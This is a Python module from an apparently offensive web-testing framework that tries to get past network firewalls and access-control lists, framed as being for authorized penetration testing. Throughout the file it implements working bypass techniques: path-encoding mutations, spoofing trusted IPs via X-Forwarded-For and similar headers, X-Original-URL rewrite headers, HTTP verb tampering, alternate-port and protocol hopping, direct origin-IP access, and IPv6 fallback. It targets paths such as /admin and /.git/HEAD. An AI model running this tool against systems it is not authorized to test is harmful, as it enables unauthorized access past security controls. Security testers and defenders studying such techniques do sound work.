#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Firewall Bypass Module

Network / NGFW / ACL firewall bypass for authorized penetration testing.

This is a different layer from the existing WAF / GateBreaker stack:

    * WAF bypass        – mutate *payloads* so a signature filter lets them
                          through (encoding, comments, homoglyphs).
    * GateBreaker       – detect WAF / auth / rate-limit *gates* and drive
                          the BypassOrchestrator ladder against them.
    * Firewall Bypass   – reach a host, port, path or origin that a
                          *network / host / next-gen firewall* is refusing
                          based on IP, port, protocol, Host header, or URL
                          ACL — independent of payload content.

Bypass families (all bounded, all fail-closed on transport errors):

    1. Path ACL          – encoding / case / slash / matrix / unicode
                           mutations that confuse URL-based firewall rules
                           which do not share the backend's normalizer.
    2. IP allowlist      – trusted-proxy header spoofing (X-Forwarded-For,
                           CF-Connecting-IP, True-Client-IP, Forwarded, …)
                           against firewalls that trust the edge.
    3. Rewrite headers   – X-Original-URL / X-Rewrite-URL / X-Override-URL
                           so a front-end ACL sees ``/`` while the origin
                           routes ``/admin``.
    4. Port filter       – hop to common alternate ports (8080, 8443, …)
                           when the advertised port is filtered.
    5. Protocol switch   – HTTP ↔ HTTPS when one scheme is firewalled.
    6. Method ACL        – verb tampering / X-HTTP-Method-Override against
                           method-based firewall rules.
    7. Origin hop        – talk to a discovered origin IP with the original
                           Host header (skips the perimeter appliance).
    8. IPv6 dual-stack   – AAAA when A is filtered (or the reverse).

Design notes:
    * Defensive throughout: ``requester.request`` may return ``None``.
    * Every loop is hard-capped (paths, mutations, headers, ports).
    * Per-probe timeout is 8 s; total wall-clock cap is 45 s per URL.
    * Works standalone: builds a local BypassOrchestrator when
      ``engine.bypass`` is missing.
    * Does **not** invent new WAF payload encodings — that remains
      ``modules.waf`` / ``core.bypass``.
"""
from __future__ import annotations

import socket
import time
from urllib.parse import urlparse, urlunparse

from modules.base import BaseModule

PROBE_TIMEOUT = 8
MAX_TOTAL_TIME = 45
CONNECT_TIMEOUT = 1.5

# Common restricted paths that perimeter ACLs frequently block while the
# application itself would serve them. Keep the list short — each entry
# can trigger a full mutation ladder.
_RESTRICTED_PATHS = (
    "/admin",
    "/administrator",
    "/internal",
    "/console",
    "/manager",
    "/server-status",
    "/.git/HEAD",
    "/phpmyadmin",
    "/wp-admin",
    "/api/internal",
)

# Alternate ports tried when the advertised port is filtered.
_ALT_PORTS = (80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9443, 4443)

# Trusted-looking source IPs used for allowlist spoofing. Internal /
# loopback / link-local ranges are the ones poorly-configured firewalls
# most often treat as "already inside".
_SPOOF_IPS = ("127.0.0.1", "::1", "10.0.0.1", "192.168.1.1", "172.16.0.1")

# Header names that NGFWs / load-balancers treat as the client IP.
_IP_HEADERS = (
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "X-Cluster-Client-IP",
    "X-Azure-ClientIP",
    "X-ProxyUser-IP",
)

_REWRITE_HEADERS = ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Forwarded-Path")

_METHOD_OVERRIDE_HEADERS = (
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
)

_BLOCK_STATUS = (401, 403, 406, 451, 511)
_OK_STATUS = range(200, 400)

_FW_BODY_SIGNATURES = (
    "access denied",
    "blocked by",
    "firewall",
    "network policy",
    "security policy",
    "not allowed from",
    "your ip",
    "source ip",
    "acl deny",
    "acl denied",
    "unauthorized network",
    "geo-blocked",
    "country blocked",
    "request blocked",
    "forbidden by policy",
    "this request was blocked",
    "connection refused by policy",
)

_AUTH_BODY_SIGNATURES = (
    "please log in",
    "login required",
    "sign in",
    "invalid token",
    "missing token",
    "expired token",
    "unauthenticated",
)

_MIN_BODY = 16


class FirewallBypassModule(BaseModule):
    """Detect network/NGFW/ACL firewalls and attempt to bypass them."""

    name = "Firewall Bypass"
    vuln_type = "firewall_bypass"

    _MAX_PATH_MUTATIONS = 12
    _MAX_RESTRICTED = 8
    _MAX_IP_ATTEMPTS = 8
    _MAX_REWRITE = 6
    _MAX_PORTS = 6

    def __init__(self, engine):
        super().__init__(engine)
        self._processed: set = set()
        self._report: list[dict] = []
        self._local_orchestrator = None
        self._deadline = 0.0

    # ------------------------------------------------------------------
    # Public entry points
    # ------------------------------------------------------------------
    def test(self, url, method, param, value):
        """Parameter-aware entry. Firewall bypass is URL-level; we still
        honour a path-like parameter by grafting it onto the URL."""
        target = url
        if param and value and self._looks_like_path(value):
            target = self._join_path(url, value)
        self._run(target)

    def test_url(self, url):
        self._run(url)

    def get_report(self) -> list[dict]:
        """Structured results from the most recent run.

        Each entry::

            {"family": str, "detected": bool, "broken": bool,
             "technique": str | None, "evidence": str, "url": str}
        """
        return list(self._report)

    # ------------------------------------------------------------------
    # Orchestration
    # ------------------------------------------------------------------
    def _run(self, url: str):
        if not url or url in self._processed:
            return
        self._processed.add(url)
        self._deadline = time.time() + MAX_TOTAL_TIME
        self._report = []

        baseline = self._send(url)
        parsed = urlparse(url)

        if self._is_connection_failure(baseline):
            self._try_port_and_protocol(url, parsed)
            self._try_ipv6(url, parsed)
            self._try_origin_hop(url, parsed)
            self._finish()
            return

        blocked = self._is_firewall_blocked(baseline)

        if blocked:
            self._try_ip_allowlist(url, baseline)
            self._try_method_override(url, baseline)
            self._try_path_acl(url, parsed.path or "/", baseline)
            self._try_rewrite_headers(url, parsed.path or "/", baseline)
            self._try_protocol_switch(url, parsed, baseline)
            self._try_origin_hop(url, parsed)
        else:
            # Target itself is reachable — hunt for *other* paths the
            # perimeter ACL is hiding, then try to break those.
            self._probe_restricted_paths(url, parsed)
            # Origin hop is still useful even on a live front-end: it
            # reveals whether the origin is exposed without the firewall.
            self._try_origin_hop(url, parsed)

        self._finish()

    def _budget_left(self) -> bool:
        return time.time() < self._deadline

    def _finish(self):
        for entry in self._report:
            if entry.get("broken"):
                self._emit_bypass_finding(entry)
        self._print_summary()

    # ------------------------------------------------------------------
    # 1. Path ACL
    # ------------------------------------------------------------------
    def _try_path_acl(self, url: str, path: str, blocked_resp):
        if not self._budget_left() or not path or path == "/":
            return
        entry = self._blank("path_acl", url)
        entry["detected"] = True
        entry["evidence"] = (
            f"Path '{path}' returned {getattr(blocked_resp, 'status_code', '?')} "
            f"(path ACL / URL filter present)"
        )

        block_status = getattr(blocked_resp, "status_code", 403)
        tried = 0
        for mutated in self._path_mutations(path):
            if not self._budget_left() or tried >= self._MAX_PATH_MUTATIONS:
                break
            if mutated == path:
                continue
            tried += 1
            probe_url = self._replace_path(url, mutated)
            resp = self._send(probe_url)
            if self._reached_backend(resp, block_status):
                entry["broken"] = True
                entry["technique"] = f"path_mutation:{mutated}"
                entry["evidence"] = (
                    f"Path '{path}' blocked ({block_status}); "
                    f"mutated path '{mutated}' returned "
                    f"{resp.status_code} — path ACL bypassed"
                )
                entry["url"] = probe_url
                break
        self._report.append(entry)

    def _probe_restricted_paths(self, url: str, parsed):
        if not self._budget_left():
            return
        origin = f"{parsed.scheme}://{parsed.netloc}"
        tried = 0
        for path in _RESTRICTED_PATHS:
            if not self._budget_left() or tried >= self._MAX_RESTRICTED:
                break
            tried += 1
            probe = origin + path
            resp = self._send(probe)
            if not self._is_firewall_blocked(resp):
                continue
            # A restricted path is blocked — attempt mutations.
            self._try_path_acl(probe, path, resp)
            if self._budget_left():
                self._try_rewrite_headers(origin + "/", path, resp)
            if self._budget_left():
                self._try_ip_allowlist(probe, resp)

    @staticmethod
    def _path_mutations(path: str) -> list[str]:
        """Generate a bounded set of ACL-evading path variants.

        These exploit the common gap between a firewall's string match
        and the origin's URL normalizer (IIS, nginx, Apache, Tomcat).
        """
        raw = path if path.startswith("/") else "/" + path
        stripped = raw.rstrip("/") or "/"
        leaf = stripped.rsplit("/", 1)[-1]
        parent = stripped[: -len(leaf)] if leaf else "/"

        variants = [
            raw + "/",                          # trailing slash
            raw.rstrip("/") or "/",             # strip slash
            "//" + raw.lstrip("/"),             # extra leading slash
            "/." + raw,                         # /./admin
            raw + "/.",                         # /admin/.
            raw + ";",                          # matrix / IIS semicolon
            raw + ";",                          # (kept for stability)
            raw + "%00",                        # null terminator
            raw + "%09",                        # trailing tab
            raw + "%20",                        # trailing space
            raw + ".",                          # trailing dot (IIS)
            parent + leaf.upper() if leaf else raw,          # ADMIN
            parent + (leaf[:1].upper() + leaf[1:] if leaf else ""),  # Admin
            raw.replace("/", "/%2e/"),          # /%2e/admin
            raw.replace("/", "/./"),            # /./admin (inner)
            "".join(f"%{ord(c):02x}" if c.isalpha() else c for c in raw),  # %61dmin
            raw + ".json",
            raw + ".html",
            raw + "%2f",
            raw.replace("/", "%2f"),
            "/;" + raw.lstrip("/"),             # /;admin
            raw + "%0d",                        # CR
            raw + "%0a",                        # LF
        ]
        # Dedup while preserving order; drop empties / identical.
        seen = {raw}
        out = []
        for v in variants:
            if not v or v in seen:
                continue
            seen.add(v)
            out.append(v)
        return out

    # ------------------------------------------------------------------
    # 2. IP allowlist
    # ------------------------------------------------------------------
    def _try_ip_allowlist(self, url: str, blocked_resp):
        if not self._budget_left():
            return
        entry = self._blank("ip_acl", url)
        entry["detected"] = True
        block_status = getattr(blocked_resp, "status_code", 403)
        entry["evidence"] = (
            f"Request returned {block_status} — attempting trusted-proxy "
            f"IP spoof against an allowlist ACL"
        )

        tried = 0
        for ip in _SPOOF_IPS:
            if not self._budget_left() or tried >= self._MAX_IP_ATTEMPTS:
                break
            headers = {name: ip for name in _IP_HEADERS}
            headers["Forwarded"] = f"for={ip};proto=https"
            tried += 1
            resp = self._send(url, headers=headers)
            if self._reached_backend(resp, block_status):
                entry["broken"] = True
                entry["technique"] = f"ip_spoof:{ip}"
                entry["evidence"] = (
                    f"Blocked ({block_status}) without spoofed IP; "
                    f"X-Forwarded-For={ip} returned {resp.status_code} "
                    f"— IP allowlist bypassed"
                )
                break
        self._report.append(entry)

    # ------------------------------------------------------------------
    # 3. Rewrite headers
    # ------------------------------------------------------------------
    def _try_rewrite_headers(self, url: str, hidden_path: str, blocked_resp):
        if not self._budget_left() or not hidden_path:
            return
        entry = self._blank("rewrite_header", url)
        entry["detected"] = True
        block_status = getattr(blocked_resp, "status_code", 403)
        entry["evidence"] = (
            f"Path '{hidden_path}' blocked ({block_status}); "
            f"trying front-end rewrite headers"
        )

        # Hit a likely-allowed URL (site root) while asking the origin
        # to serve the hidden path via rewrite headers.
        parsed = urlparse(url)
        decoy = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))
        tried = 0
        for header in _REWRITE_HEADERS:
            if not self._budget_left() or tried >= self._MAX_REWRITE:
                break
            tried += 1
            resp = self._send(decoy, headers={header: hidden_path})
            if self._reached_backend(resp, block_status) and self._body_differs(resp, blocked_resp):
                entry["broken"] = True
                entry["technique"] = f"rewrite:{header}"
                entry["evidence"] = (
                    f"Direct '{hidden_path}' blocked ({block_status}); "
                    f"{header}: {hidden_path} on {decoy} returned "
                    f"{resp.status_code} — rewrite-header ACL bypass"
                )
                entry["url"] = decoy
                break
        self._report.append(entry)

    # ------------------------------------------------------------------
    # 4 + 5. Port filter + protocol switch
    # ------------------------------------------------------------------
    def _try_port_and_protocol(self, url: str, parsed):
        if not self._budget_left():
            return
        entry = self._blank("port_filter", url)
        entry["detected"] = True
        entry["evidence"] = (
            f"Connection to {parsed.hostname}:{parsed.port or parsed.scheme} "
            f"failed — probing alternate ports / schemes"
        )

        host = parsed.hostname
        if not host:
            self._report.append(entry)
            return

        advertised = parsed.port or (443 if parsed.scheme == "https" else 80)
        tried = 0
        for port in _ALT_PORTS:
            if not self._budget_left() or tried >= self._MAX_PORTS:
                break
            if port == advertised:
                continue
            tried += 1
            if not self._port_open(host, port):
                continue
            scheme = "https" if port in (443, 8443, 9443, 4443) else "http"
            probe = urlunparse((scheme, f"{host}:{port}", parsed.path or "/", parsed.params, parsed.query, ""))
            resp = self._send(probe)
            if resp is not None and resp.status_code in _OK_STATUS:
                entry["broken"] = True
                entry["technique"] = f"alt_port:{scheme}:{port}"
                entry["evidence"] = (
                    f"Advertised port filtered; {scheme}://{host}:{port} "
                    f"returned {resp.status_code} — port-filter bypassed"
                )
                entry["url"] = probe
                break
        self._report.append(entry)

        if not entry["broken"] and self._budget_left():
            self._try_protocol_switch(url, parsed, None)

    def _try_protocol_switch(self, url: str, parsed, blocked_resp):
        if not self._budget_left() or not parsed.scheme:
            return
        # Don't duplicate a successful port-filter result.
        if any(e.get("family") == "protocol_switch" for e in self._report):
            return
        entry = self._blank("protocol_switch", url)
        alt_scheme = "http" if parsed.scheme == "https" else "https"
        alt_port = 80 if alt_scheme == "http" else 443
        # Keep an explicit non-default port if the caller set one that
        # still makes sense; otherwise flip to the scheme default.
        netloc = parsed.hostname or parsed.netloc
        if parsed.port and parsed.port not in (80, 443):
            netloc = f"{parsed.hostname}:{parsed.port}"
        else:
            netloc = f"{parsed.hostname}:{alt_port}"
        probe = urlunparse((alt_scheme, netloc, parsed.path or "/", parsed.params, parsed.query, ""))
        resp = self._send(probe)
        if resp is not None and resp.status_code in _OK_STATUS:
            entry["detected"] = True
            entry["broken"] = True
            entry["technique"] = f"scheme:{alt_scheme}"
            entry["evidence"] = (
                f"{parsed.scheme} blocked or filtered; "
                f"{alt_scheme}://{netloc} returned {resp.status_code} "
                f"— protocol-filter bypassed"
            )
            entry["url"] = probe
        elif blocked_resp is not None and self._is_firewall_blocked(blocked_resp):
            entry["detected"] = True
            entry["evidence"] = (
                f"{parsed.scheme} blocked "
                f"({getattr(blocked_resp, 'status_code', '?')}); "
                f"{alt_scheme} did not open a path through"
            )
        self._report.append(entry)

    # ------------------------------------------------------------------
    # 6. Method ACL
    # ------------------------------------------------------------------
    def _try_method_override(self, url: str, blocked_resp):
        if not self._budget_left():
            return
        entry = self._blank("method_acl", url)
        entry["detected"] = True
        block_status = getattr(blocked_resp, "status_code", 403)
        entry["evidence"] = f"GET returned {block_status}; trying verb / override bypass"

        for method in ("POST", "HEAD", "OPTIONS", "TRACE", "PROPFIND"):
            if not self._budget_left():
                break
            resp = self._send(url, method=method)
            if self._reached_backend(resp, block_status):
                entry["broken"] = True
                entry["technique"] = f"verb:{method}"
                entry["evidence"] = (
                    f"GET blocked ({block_status}); {method} returned "
                    f"{resp.status_code} — method ACL bypassed"
                )
                break
        if not entry["broken"]:
            for header in _METHOD_OVERRIDE_HEADERS:
                if not self._budget_left():
                    break
                resp = self._send(url, method="POST", headers={header: "GET"})
                if self._reached_backend(resp, block_status):
                    entry["broken"] = True
                    entry["technique"] = f"override:{header}"
                    entry["evidence"] = (
                        f"GET blocked ({block_status}); POST + {header}: GET "
                        f"returned {resp.status_code} — method ACL bypassed"
                    )
                    break
        self._report.append(entry)

    # ------------------------------------------------------------------
    # 7. Origin hop
    # ------------------------------------------------------------------
    def _try_origin_hop(self, url: str, parsed):
        if not self._budget_left():
            return
        origin_ip = self._discover_origin_ip()
        if not origin_ip:
            return
        host = parsed.hostname
        if not host or origin_ip == host:
            return

        entry = self._blank("origin_hop", url)
        entry["detected"] = True
        entry["evidence"] = f"Origin IP candidate {origin_ip} — probing direct access"

        from utils.helpers import build_origin_target

        probe = build_origin_target(url, origin_ip)
        resp = self._send(probe, headers={"Host": parsed.netloc})
        if resp is not None and resp.status_code in _OK_STATUS:
            entry["broken"] = True
            entry["technique"] = f"origin_ip:{origin_ip}"
            entry["evidence"] = (
                f"Direct origin {origin_ip} with Host: {parsed.netloc} "
                f"returned {resp.status_code} — perimeter firewall bypassed"
            )
            entry["url"] = probe
        self._report.append(entry)

    def _discover_origin_ip(self):
        """Best-effort origin IP from earlier pipeline phases / config."""
        result = getattr(self.engine, "_origin_result", None) or {}
        ip = result.get("origin_ip") if isinstance(result, dict) else None
        if ip:
            return ip
        cfg = self.config or {}
        return cfg.get("origin_ip") or None

    # ------------------------------------------------------------------
    # 8. IPv6 dual-stack
    # ------------------------------------------------------------------
    def _try_ipv6(self, url: str, parsed):
        if not self._budget_left():
            return
        host = parsed.hostname
        if not host:
            return
        ipv6 = self._resolve_ipv6(host)
        if not ipv6:
            return
        entry = self._blank("ipv6", url)
        entry["detected"] = True
        entry["evidence"] = f"IPv4 filtered; AAAA record {ipv6} available"
        # Bracket IPv6 literals in the URL netloc.
        port = parsed.port
        netloc = f"[{ipv6}]" if port is None else f"[{ipv6}]:{port}"
        probe = urlunparse((parsed.scheme or "https", netloc, parsed.path or "/", parsed.params, parsed.query, ""))
        resp = self._send(probe, headers={"Host": parsed.netloc})
        if resp is not None and resp.status_code in _OK_STATUS:
            entry["broken"] = True
            entry["technique"] = f"ipv6:{ipv6}"
            entry["evidence"] = (
                f"IPv4 filtered; IPv6 {ipv6} returned {resp.status_code} "
                f"— dual-stack firewall bypass"
            )
            entry["url"] = probe
        self._report.append(entry)

    # ------------------------------------------------------------------
    # Findings + summary
    # ------------------------------------------------------------------
    _SEVERITY = {
        "path_acl": "HIGH",
        "ip_acl": "HIGH",
        "rewrite_header": "HIGH",
        "origin_hop": "HIGH",
        "port_filter": "MEDIUM",
        "protocol_switch": "MEDIUM",
        "method_acl": "MEDIUM",
        "ipv6": "MEDIUM",
    }
    _LABEL = {
        "path_acl": "path ACL",
        "ip_acl": "IP allowlist",
        "rewrite_header": "rewrite-header ACL",
        "origin_hop": "origin-IP hop",
        "port_filter": "port filter",
        "protocol_switch": "protocol filter",
        "method_acl": "method ACL",
        "ipv6": "IPv6 dual-stack",
    }

    def _emit_bypass_finding(self, entry):
        family = entry.get("family", "firewall")
        label = self._LABEL.get(family, family)
        technique = entry.get("technique") or "unknown"
        self._add_finding(
            technique=f"Firewall Bypass: {label} ({technique})",
            url=entry.get("url") or "",
            method="GET",
            param="",
            payload=technique,
            evidence=entry.get("evidence", ""),
            severity=self._SEVERITY.get(family, "MEDIUM"),
            confidence=0.75,
        )

    def _print_summary(self):
        if self.config.get("quiet"):
            return
        broken = [e for e in self._report if e.get("broken")]
        parts = [
            f"{self._LABEL.get(e['family'], e['family'])} via {e.get('technique')}"
            for e in broken
        ]
        msg = f"Firewall Bypass: {len(broken)}/{len(self._report)} controls broken"
        if parts:
            msg += " (" + ", ".join(parts) + ")"
        self._log(msg)

    def _log(self, msg):
        try:
            from config import Colors

            print(Colors.warning(msg) if hasattr(Colors, "warning") else msg)
        except Exception:
            print(msg)

    # ------------------------------------------------------------------
    # Transport helpers
    # ------------------------------------------------------------------
    def _send(self, url, method="GET", headers=None, timeout=None):
        try:
            return self.requester.request(
                url,
                method or "GET",
                headers=headers or None,
                timeout=timeout or PROBE_TIMEOUT,
            )
        except Exception:
            return None

    def _port_open(self, host: str, port: int) -> bool:
        """TCP connect probe. Overridable in tests via ``_connect``."""
        try:
            return self._connect(host, port, CONNECT_TIMEOUT)
        except Exception:
            return False

    @staticmethod
    def _connect(host: str, port: int, timeout: float) -> bool:
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            return True
        except OSError:
            return False
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass

    def _resolve_ipv6(self, host: str):
        try:
            infos = socket.getaddrinfo(host, None, socket.AF_INET6)
        except (socket.gaierror, OSError):
            return None
        for info in infos:
            addr = info[4][0] if info and info[4] else None
            if addr:
                return addr
        return None

    # ------------------------------------------------------------------
    # Classification
    # ------------------------------------------------------------------
    def _is_connection_failure(self, resp) -> bool:
        return resp is None

    def _is_firewall_blocked(self, resp) -> bool:
        if resp is None:
            return False
        body = (getattr(resp, "text", "") or "").lower()
        if any(sig in body for sig in _AUTH_BODY_SIGNATURES) and resp.status_code == 401:
            return False
        if resp.status_code in _BLOCK_STATUS:
            # Bare 403/401 with no WAF-ish body is still an ACL signal
            # for this module (path / IP firewalls often send empty 403).
            return True
        return any(sig in body for sig in _FW_BODY_SIGNATURES)

    def _reached_backend(self, resp, block_status) -> bool:
        if resp is None:
            return False
        if self._is_firewall_blocked(resp) and resp.status_code == block_status:
            return False
        if resp.status_code in _OK_STATUS:
            body = getattr(resp, "text", "") or ""
            return len(body) >= _MIN_BODY or resp.status_code in range(300, 400)
        return False

    @staticmethod
    def _body_differs(a, b) -> bool:
        if a is None or b is None:
            return False
        ta = getattr(a, "text", "") or ""
        tb = getattr(b, "text", "") or ""
        if ta == tb:
            return False
        # Require a meaningful delta so we don't treat a differently
        # worded block page as success.
        return abs(len(ta) - len(tb)) > 24 or ta[:64] != tb[:64]

    # ------------------------------------------------------------------
    # URL helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _blank(family: str, url: str) -> dict:
        return {
            "family": family,
            "detected": False,
            "broken": False,
            "technique": None,
            "evidence": "",
            "url": url,
        }

    @staticmethod
    def _looks_like_path(value: str) -> bool:
        v = (value or "").strip()
        return v.startswith("/") or v.startswith("..") or "/" in v

    @staticmethod
    def _join_path(url: str, value: str) -> str:
        parsed = urlparse(url)
        path = value if value.startswith("/") else (parsed.path.rstrip("/") + "/" + value)
        return urlunparse((parsed.scheme, parsed.netloc, path, "", parsed.query, ""))

    @staticmethod
    def _replace_path(url: str, new_path: str) -> str:
        parsed = urlparse(url)
        return urlunparse((parsed.scheme, parsed.netloc, new_path, parsed.params, parsed.query, ""))
